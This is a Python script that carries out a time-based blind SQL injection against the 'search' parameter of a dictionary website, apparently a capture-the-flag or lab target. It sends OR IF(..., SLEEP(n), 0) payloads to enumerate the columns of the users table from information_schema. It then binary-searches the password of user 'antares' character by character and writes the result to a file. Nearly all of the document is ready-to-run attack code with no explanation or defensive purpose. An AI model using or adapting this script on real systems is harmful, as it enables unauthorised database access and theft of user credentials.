#!/usr/bin/env python3
"""
get_antares_password.py

1) Enumerates columns for vega_dictionary.users
2) Tries common username/password column name combinations
3) Extracts the password for user 'antares' using the working OR-style time-based SQLi:
     ?search=' OR IF(<cond>, SLEEP(SLEEP_TIME), 0)-- -

Result is printed and saved to antares_password.txt if found.
"""

import requests, time, sys

# CONFIG
BASE_URL = "http://englishdictionary.hv/"   # trailing slash
PARAM = "search"
DB = "vega_dictionary"
TABLE = "users"
TARGET_USER = "antares"
SLEEP_TIME = 6
TIMEOUT = SLEEP_TIME + 4
THRESH = SLEEP_TIME - 1.5
MAX_COLS = 100
MAX_NAME_LEN = 60
MAX_VAL_LEN = 160
DELAY = 0.12
HEADERS = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64)","Connection":"keep-alive"}
PROXIES = None  # set to {'http':'http://127.0.0.1:8080'} if using Burp
# END CONFIG

session = requests.Session()
session.headers.update(HEADERS)
if PROXIES:
    session.proxies.update(PROXIES)

def send_cond(cond):
    payload = f"' OR IF({cond}, SLEEP({SLEEP_TIME}), 0)-- -"
    try:
        t0 = time.time()
        r = session.get(BASE_URL, params={PARAM: payload}, timeout=TIMEOUT)
        return time.time() - t0
    except requests.exceptions.ReadTimeout:
        return TIMEOUT
    except Exception as e:
        print("[!] request error:", e, file=sys.stderr)
        return 0.0

def cond_true(cond):
    return send_cond(cond) > THRESH

def enum_columns(max_rows=MAX_COLS):
    print(f"[*] Enumerating columns for {DB}.{TABLE}")
    cols = []
    for idx in range(max_rows):
        # check existence of a column at offset idx
        sql = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{DB}' AND table_name='{TABLE}' LIMIT {idx},1"
        exists_cond = f"LENGTH(({sql})) > 0"
        if not cond_true(exists_cond):
            break
        # extract the column name
        name = extract_string_from_select(sql, MAX_NAME_LEN)
        if name:
            cols.append(name)
            print(f"  [{idx}] {name}")
        else:
            print(f"  [{idx}] <empty?>")
        time.sleep(DELAY)
    print(f"[*] Found {len(cols)} column(s).")
    return cols

def extract_string_from_select(sql_expr, max_len=MAX_NAME_LEN):
    # binary-search length
    lo, hi = 0, max_len
    while lo < hi:
        mid = (lo + hi + 1)//2
        cond = f"LENGTH(({sql_expr})) >= {mid}"
        if cond_true(cond):
            lo = mid
        else:
            hi = mid - 1
        time.sleep(DELAY)
    length = lo
    if length == 0:
        return None
    s = ""
    for pos in range(1, length+1):
        a, b = 32, 126
        found = None
        while a <= b:
            mid = (a+b)//2
            cond = f"ASCII(SUBSTRING(({sql_expr}),{pos},1)) > {mid}"
            if cond_true(cond):
                a = mid + 1
            else:
                eq = f"ASCII(SUBSTRING(({sql_expr}),{pos},1)) = {mid}"
                if cond_true(eq):
                    found = mid
                    s += chr(mid)
                    break
                else:
                    b = mid - 1
            time.sleep(DELAY)
        if found is None:
            s += '?'
    return s

def test_table_row_exists(user_col, user_val):
    sql = f"SELECT {user_col} FROM {DB}.{TABLE} WHERE {user_col} = '{user_val}' LIMIT 1"
    return cond_true(f"LENGTH(({sql})) > 0")

def find_value_length(user_col, pass_col, user_val, max_len=MAX_VAL_LEN):
    lo, hi = 0, max_len
    while lo < hi:
        mid = (lo + hi)//2
        cond = f"LENGTH((SELECT {pass_col} FROM {DB}.{TABLE} WHERE {user_col} = '{user_val}' LIMIT 1)) > {mid}"
        if cond_true(cond):
            lo = mid + 1
        else:
            hi = mid
        time.sleep(DELAY)
    return lo

def extract_value(user_col, pass_col, user_val, length):
    if length == 0:
        return None
    out = ""
    for pos in range(1, length+1):
        a, b = 32, 126
        found = None
        while a <= b:
            mid = (a+b)//2
            cond = f"ASCII(SUBSTRING((SELECT {pass_col} FROM {DB}.{TABLE} WHERE {user_col} = '{user_val}' LIMIT 1),{pos},1)) > {mid}"
            if cond_true(cond):
                a = mid + 1
            else:
                eq = f"ASCII(SUBSTRING((SELECT {pass_col} FROM {DB}.{TABLE} WHERE {user_col} = '{user_val}' LIMIT 1),{pos},1)) = {mid}"
                if cond_true(eq):
                    out += chr(mid)
                    found = mid
                    print(f"    pos {pos}: {chr(mid)} (ASCII {mid})")
                    break
                else:
                    b = mid - 1
            time.sleep(DELAY)
        if found is None:
            out += '?'
            print(f"    pos {pos}: unknown -> '?'")
    return out

def try_common_pairs(cols, user_val=TARGET_USER):
    # make candidate lists from discovered columns and common names
    user_candidates = [c for c in cols if any(x in c.lower() for x in ("user","name","login"))]
    pass_candidates = [c for c in cols if any(x in c.lower() for x in ("pass","pwd","hash"))]
    # ensure some defaults if lists empty
    fallback_user = ["username","user","name","login"]
    fallback_pass = ["password","pass","passwd","pwd","hash"]
    if not user_candidates:
        user_candidates = [c for c in cols if c.lower() in fallback_user] + fallback_user
    if not pass_candidates:
        pass_candidates = [c for c in cols if c.lower() in fallback_pass] + fallback_pass

    tried = []
    for uc in user_candidates:
        for pc in pass_candidates:
            pair = (uc, pc)
            if pair in tried:
                continue
            tried.append(pair)
            print(f"[*] Trying pair: user_col='{uc}' pass_col='{pc}'")
            # check if the user exists in this user_col
            if not test_table_row_exists(uc, user_val):
                print("    -> row not found with this user_col.")
                continue
            # find password length
            plen = find_value_length(uc, pc, user_val)
            print(f"    -> reported length for {pc}: {plen}")
            if plen == 0:
                print("    -> pass length 0 (empty?)")
                continue
            # extract password
            pw = extract_value(uc, pc, user_val, plen)
            if pw:
                print(f"\n[FOUND] For {user_val}: {pc} = {pw}")
                with open("antares_password.txt","w") as f:
                    f.write(pw)
                return True, uc, pc, pw
    return False, None, None, None

def main():
    # baseline sanity check
    print("[*] baseline test (1=1)")
    if not cond_true("1=1"):
        elapsed = send_cond("1=1")
        print(f"[!] baseline failed (elapsed {elapsed:.2f}s). Check payload format or SLEEP_TIME.")
        return

    cols = enum_columns()
    if not cols:
        print("[!] No columns discovered. Try increasing MAX_COLS or check DB/TABLE.")
        return

    ok, ucol, pcol, pw = try_common_pairs(cols)
    if ok:
        print(f"[*] Success. user_col='{ucol}' pass_col='{pcol}' password='{pw}'")
        print("[*] Saved to antares_password.txt")
    else:
        print("[!] Could not extract password with the tried column name guesses.")
        print("    Columns discovered:", ", ".join(cols))
        print("    You can re-run with adjusted SLEEP_TIME or add more candidate names to fallback lists.")

if __name__ == "__main__":
    main()
